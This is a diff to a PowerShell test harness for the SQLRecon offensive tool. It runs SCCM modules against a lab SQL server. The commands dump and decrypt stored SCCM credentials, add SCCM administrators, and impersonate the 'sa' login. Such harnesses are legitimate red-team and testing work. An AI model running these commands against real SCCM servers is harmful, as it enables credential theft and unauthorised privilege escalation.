@@ -10,7 +10,7 @@
 #>
 $global:timeout = 1
 $global:count = 1
-$global:modules = 10
+$global:modules = 20
 $global:timestamp = Get-Date -Format "MM-dd-yyyy-HH-mm"
 
 <#
@@ -24,16 +24,17 @@ $authentication = "WinToken"
 <#
     The following variables can be changed.
     - $sqlreconPath is the path to where SQLRecon is on disk.
-    - $server1 is the hostname or IP of an SCCM SQL server.
-    - $database1 is the name of the SCCM database, this will start with a 'CM_'
-    - $ouputPath is where you want to output the results of this script on disk in markdown.
+    - $server is the hostname or IP of an SCCM SQL server.
+    - $database is the name of the SCCM database, this will start with a 'CM_'
+    - $outputPath is where you want to output the results of this script on disk in markdown.
       keep in mind that the path can not have special characters like ':'. '-' is fine.
 #>
 $sqlreconPath = ".\SQLRecon.exe"
-$server1 = "MECM01"
-$database1 = "CM_KAW"
-$authenticationFormatted = $authentication.replace(' ','')
-$ouputPath = $PSScriptRoot + "\sqlrecon-sccm-$authenticationFormatted-$global:timestamp.md"
+$server = "MECM01"
+$database = "CM_KAW"
+$impersonateUser = "sa"
+$authenticationFormatted = $authentication.replace(' ','-').replace('/','').replace('.','-').replace(':','-')
+$outputPath = $PSScriptRoot + "\sqlrecon-sccm-$authenticationFormatted-$global:timestamp.md"
 
 <#
     .Description
@@ -44,7 +45,7 @@ Function Execute($command)
     Write-Output "($global:count/$global:modules)"
     Write-Output $command
     Write-Output ""
-    Write-Output "Output:"
+    Write-Output "Expected Output:"
     Write-Output '```'
     Invoke-Expression $command
     Write-Output '```'
@@ -57,36 +58,49 @@ Function Execute($command)
 $ErrorActionPreference="SilentlyContinue"
 Stop-Transcript | out-null
 $ErrorActionPreference = "Continue"
-Start-Transcript -path $ouputPath
+Start-Transcript -path $outputPath
 
 Write-Output "---------------------------------------------------------------------"
 Write-Output "[+] SQLRecon - SCCM Modules Test Cases"
 Write-Output "[+] Variables Set:"
 Write-Output "  |-> SQLRecon Path: $sqlreconPath"
-Write-Output "  |-> Ouput Path: $ouputPath"
+Write-Output "  |-> Ouput Path: $outputPath"
 Write-Output "  |-> Authentication: $authentication"
-Write-Output "  |-> SCCM SQL Server: $server1"
-Write-Output "  |-> SCCM Database: $database1"
+Write-Output "  |-> Impersonating User: $impersonateUser"
+Write-Output "  |-> SCCM SQL Server: $server"
+Write-Output "  |-> SCCM Database: $database"
 Write-Output "[+] Starting test cases against $modules modules at $global:timestamp"
 Write-Output "---------------------------------------------------------------------"
 Write-Output ""
 
-# Add test cases in this area. In this case there are 10, which is why $global:modules is set to 10.
-Execute "$sqlreconPath /help"
-Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:susers"
-Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:susers /option:'user jm'"
-Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:ssites"
-Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:slogons"
-Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:stasklist"
-Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:staskdata"
-Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:scredentials"
+# Add test cases in this area. In this case there are 20, which is why $global:modules is set to 20.
+Execute "$sqlreconPath /auth:$authentication /host:$server /database:$database /sccm:users"
+Execute "$sqlreconPath /auth:$authentication /host:$server /database:$database /sccm:sites"
+Execute "$sqlreconPath /auth:$authentication /host:$server /database:$database /sccm:logons"
+Execute "$sqlreconPath /auth:$authentication /host:$server /database:$database /sccm:tasklist"
+Execute "$sqlreconPath /auth:$authentication /host:$server /database:$database /sccm:taskdata"
+Execute "$sqlreconPath /auth:$authentication /host:$server /database:$database /sccm:credentials"
 Write-Output ""
 Write-Output "[+] Executing Privileged Commands"
 Write-Output ""
-Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:sdecryptcredentials"
-Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:saddadmin /user:current /sid:current"
-Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:saddadmin /user:KAWALABS\acon /sid:S-1-5-21-3113994310-608060616-2731373765-1391"
-# Execute "$sqlreconPath /auth:$authentication /host:$server1 /database:$database1 /module:sremoveadmin /user: /remove:"
+Execute "$sqlreconPath /auth:$authentication /host:$server /database:$database /sccm:decryptcredentials"
+Execute "$sqlreconPath /auth:$authentication /host:$server /database:$database /sccm:addadmin /user:current /sid:current"
+Execute "$sqlreconPath /auth:$authentication /host:$server /database:$database /sccm:addadmin /user:KAWALABS\acon /sid:S-1-5-21-3113994310-608060616-2731373765-1391"
+# Execute "$sqlreconPath /auth:$authentication /host:$server /database:$database /module:removeadmin /user: /remove:"
+Write-Output ""
+Write-Output "[+] Executing Impersonation Commands"
+Write-Output ""
+Execute "$sqlreconPath /auth:$authentication /i:$impersonateUser /host:$server /database:$database /sccm:users"
+Execute "$sqlreconPath /auth:$authentication /i:$impersonateUser /host:$server /database:$database /sccm:sites"
+Execute "$sqlreconPath /auth:$authentication /i:$impersonateUser /host:$server /database:$database /sccm:logons"
+Execute "$sqlreconPath /auth:$authentication /i:$impersonateUser /host:$server /database:$database /sccm:tasklist"
+Execute "$sqlreconPath /auth:$authentication /i:$impersonateUser /host:$server /database:$database /sccm:taskdata"
+Execute "$sqlreconPath /auth:$authentication /i:$impersonateUser /host:$server /database:$database /sccm:credentials"
+Execute "$sqlreconPath /auth:$authentication /i:$impersonateUser /host:$server /database:$database /sccm:decryptcredentials"
+Execute "$sqlreconPath /auth:$authentication /i:$impersonateUser /host:$server /database:$database /sccm:addadmin /user:current /sid:current"
+Execute "$sqlreconPath /auth:$authentication /i:$impersonateUser /host:$server /database:$database /sccm:addadmin /user:KAWALABS\acon /sid:S-1-5-21-3113994310-608060616-2731373765-1391"
+# Execute "$sqlreconPath /auth:$authentication /i:$impersonateUser /host:$server /database:$database /module:removeadmin /user: /remove:"
+Write-Output ""
 Write-Output "---------------------------------------------------------------------"
 Write-Output "[+] SQLRecon - SCCM Modules Test Cases"
 Write-Output "[+] Completed test cases against $modules modules at $global:timestamp"
